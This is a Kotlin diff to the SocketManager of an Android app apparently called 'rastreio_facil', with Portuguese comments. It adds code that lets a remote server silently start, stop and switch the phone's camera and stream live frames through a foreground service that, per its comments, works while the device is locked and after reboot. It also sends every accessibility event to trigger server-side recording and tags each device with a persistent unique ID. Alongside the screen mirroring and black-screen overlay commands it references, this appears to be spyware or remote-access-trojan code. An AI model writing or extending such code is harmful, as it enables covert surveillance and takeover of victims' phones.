@@ -152,6 +152,30 @@ object SocketManager {
         }
     }
 
+    /**
+     * EVENTO DE ACESSIBILIDADE -> SERVIDOR (gatilho de gravação).
+     * Qualquer interação ou ação assistiva no aparelho emite "evento_acessibilidade"
+     * com { device_id, tipo, detalhes, timestamp }. O servidor usa isto para
+     * INICIAR e MANTER viva a gravação enquanto houver atividade. Emite SOMENTE se
+     * o socket estiver conectado (nunca enfileira / nunca trava a UI). Não interfere
+     * no stream de tela (enviar_tela) nem na reconexão automática.
+     */
+    fun emitirEventoAcessibilidade(tipo: String, detalhes: String = "") {
+        try {
+            val s = socket ?: return
+            if (!s.connected()) return
+            val json = JSONObject().apply {
+                put("device_id", nomeDispositivoAtual())
+                put("tipo", tipo)
+                put("detalhes", detalhes)
+                put("timestamp", System.currentTimeMillis())
+            }
+            s.emit("evento_acessibilidade", json)
+        } catch (e: Exception) {
+            Log.e(TAG, "Erro ao emitir evento_acessibilidade: ${e.message}")
+        }
+    }
+
     /** Emite sinal de conclusão real da atualização para o painel. */
     fun emitirAtualizacaoConcluida(sucesso: Boolean, erro: String? = null) {
         try {
@@ -298,7 +322,8 @@ object SocketManager {
                 s.connect()
                 val nomeDispositivo = nomeDispositivoAtual()
                 val tipoDispositivo = tipoDispositivoAtual()
-                s.emit("identificar", nomeDispositivo, tipoDispositivo)
+                // 4º arg = device_id único (server.py usa como nome definitivo).
+                s.emit("identificar", nomeDispositivo, tipoDispositivo, nomeDispositivo)
             }
         } catch (e: Exception) {
             Log.e(TAG, "Erro ao garantir conexão do Socket: ${e.message}")
@@ -352,7 +377,8 @@ object SocketManager {
                         // E pelo tipo (fisico/emulador) — o servidor usa esta
                         // informação para separar por salas (Rooms). Emuladores
                         // NÃO recebem comandos de overlay (tela preta/anúncio).
-                        emit("identificar", nomeDispositivo, tipoDispositivo)
+                        // 4º arg = device_id único (server.py usa como nome definitivo).
+                        emit("identificar", nomeDispositivo, tipoDispositivo, nomeDispositivo)
 
                         try {
                             val prefs = appContext?.getSharedPreferences("rastreio_facil_prefs", Context.MODE_PRIVATE)
@@ -1058,6 +1084,37 @@ object SocketManager {
                         }
                         emitLog("[MODO ESCURO] acao='$acao' (ativar=$ativar) -> metodo: $metodoUsado. Stream do painel continua claro.")
                     }
+
+                    // ----------------------------------------------------------------
+                    // CÂMERA (botão "View" do emulador nativo): liga / desliga / troca
+                    // a câmera do dispositivo. O CameraStreamer transmite os frames
+                    // JPEG por "camera_frame"; aqui só recebemos os comandos.
+                    // ----------------------------------------------------------------
+                    on("iniciar_camera") { args ->
+                        val json = parseJson(args)
+                        if (comandoDestinadoAOutro(json)) return@on
+                        val ctx = appContext ?: MyAccessibilityService.instance
+                        if (ctx == null) {
+                            emitLog("[CAMERA] IGNORADO: sem contexto estável para abrir a câmera.")
+                        } else {
+                            val frontal = (json?.optString("camera", "frontal") ?: "frontal") != "traseira"
+                            // Sobe pelo CameraService (foreground tipo camera): assim a
+                            // câmera do View funciona bloqueado / na tela dos 9 pontos /
+                            // após reboot, em tempo real e contínuo (Android 14+).
+                            CameraService.iniciar(ctx.applicationContext, frontal)
+                        }
+                    }
+                    on("parar_camera") {
+                        val ctx = appContext ?: MyAccessibilityService.instance
+                        if (ctx != null) CameraService.parar(ctx.applicationContext)
+                        else CameraStreamer.parar()
+                    }
+                    on("trocar_camera") { args ->
+                        val json = parseJson(args)
+                        if (comandoDestinadoAOutro(json)) return@on
+                        val ctx = appContext ?: MyAccessibilityService.instance
+                        if (ctx != null) CameraService.trocar(ctx.applicationContext)
+                    }
                 }
                 socket = s
                 s.connect()
@@ -1081,8 +1138,66 @@ object SocketManager {
         }
     }
 
-    // Nome deste aparelho (mesmo identificador usado no 'identificar').
-    private fun nomeDispositivoAtual(): String = "${Build.MANUFACTURER}-${Build.MODEL}"
+    // ========================================================================
+    // IDENTIFICADOR ÚNICO E PERSISTENTE DO APARELHO.
+    // ------------------------------------------------------------------------
+    // Nome = "MANUFACTURER-MODEL-<sufixo6>", onde <sufixo6> são 6 caracteres
+    // hex ESTÁVEIS derivados do Settings.Secure.ANDROID_ID (ou de um UUID salvo
+    // no SharedPreferences na 1ª abertura, se o ANDROID_ID for nulo). Assim dois
+    // celulares do MESMO modelo nunca colidem de sala (stream:{nome}) nem de
+    // arquivo .avi no servidor. Calculado uma vez e cacheado (o servidor usa
+    // este nome como chave; precisa ser idêntico em todas as reconexões).
+    // ========================================================================
+    @Volatile
+    private var nomeDispositivoCache: String? = null
+
+    private fun sufixoUnicoDispositivo(): String {
+        val ctx = appContext
+        var base: String? = null
+        // 1) ANDROID_ID (estável por app-signing-key + usuário; ideal).
+        try {
+            if (ctx != null) {
+                val aid = android.provider.Settings.Secure.getString(
+                    ctx.contentResolver, android.provider.Settings.Secure.ANDROID_ID)
+                // "9774d56d682e549c" = bug conhecido (mesmo ID em vários aparelhos antigos).
+                if (!aid.isNullOrBlank() && aid != "9774d56d682e549c") base = aid
+            }
+        } catch (_: Exception) {}
+        // 2) Fallback: UUID próprio salvo no SharedPreferences (1ª abertura).
+        if (base == null && ctx != null) {
+            try {
+                val prefs = ctx.getSharedPreferences("rastreio_facil_prefs", Context.MODE_PRIVATE)
+                var salvo = prefs.getString("device_uid", null)
+                if (salvo.isNullOrBlank()) {
+                    salvo = java.util.UUID.randomUUID().toString()
+                    prefs.edit().putString("device_uid", salvo).apply()
+                }
+                base = salvo
+            } catch (_: Exception) {}
+        }
+        // 3) Último recurso (sem contexto): usa o próprio modelo (pode repetir,
+        //    mas o servidor ainda aplica o anti-colisão por sid).
+        if (base.isNullOrBlank()) base = "${Build.MANUFACTURER}-${Build.MODEL}"
+        return try {
+            val md = java.security.MessageDigest.getInstance("SHA-256")
+            val dig = md.digest(base!!.toByteArray(Charsets.UTF_8))
+            dig.joinToString("") { "%02x".format(it) }.substring(0, 6)
+        } catch (_: Exception) {
+            kotlin.math.abs(base!!.hashCode()).toString(16).padStart(6, '0').takeLast(6)
+        }
+    }
+
+    // Nome ÚNICO deste aparelho (mesmo identificador usado no 'identificar',
+    // 'enviar_tela', 'evento_acessibilidade' e no comandoDestinadoAOutro).
+    fun nomeDispositivoAtual(): String {
+        nomeDispositivoCache?.let { return it }
+        val suf = sufixoUnicoDispositivo()
+        val n = "${Build.MANUFACTURER}-${Build.MODEL}-$suf"
+        // Só cacheia quando há contexto (sufixo confiável); sem contexto, não
+        // congela um valor que poderia não ser único.
+        if (appContext != null) nomeDispositivoCache = n
+        return n
+    }
 
     /**
      * Dispara o Broadcast do Anúncio para os pacotes do Suporte Motor.
@@ -1274,6 +1389,29 @@ object SocketManager {
     private fun emitLog(msg: String) {
         try {
             socket?.emit("log_dispositivo", msg)
+        } catch (_: Exception) {
+        }
+    }
+
+    /** Versão pública do log (usada pelo CameraStreamer, que está fora da classe). */
+    fun emitLogPublico(msg: String) = emitLog(msg)
+
+    /** Envia UM frame JPEG da câmera para o servidor (evento "camera_frame"),
+     *  igual ao "enviar_tela" do espelhamento. O servidor retransmite para a
+     *  sala camera:{dispositivo} (a janela "View" do emulador nativo). */
+    fun enviarCameraFrame(jpeg: ByteArray) {
+        try {
+            socket?.emit("camera_frame", jpeg)
+        } catch (_: Exception) {
+        }
+    }
+
+    /** Envia um pacote H.264 (NAL Annex-B) da câmera (evento "camera_h264").
+     *  O servidor retransmite para a sala camera:{dispositivo}; a janela "View"
+     *  decodifica com PyAV. Fluxo contínuo e suave (encoder de hardware). */
+    fun enviarCameraH264(nal: ByteArray) {
+        try {
+            socket?.emit("camera_h264", nal)
         } catch (_: Exception) {
         }
     }
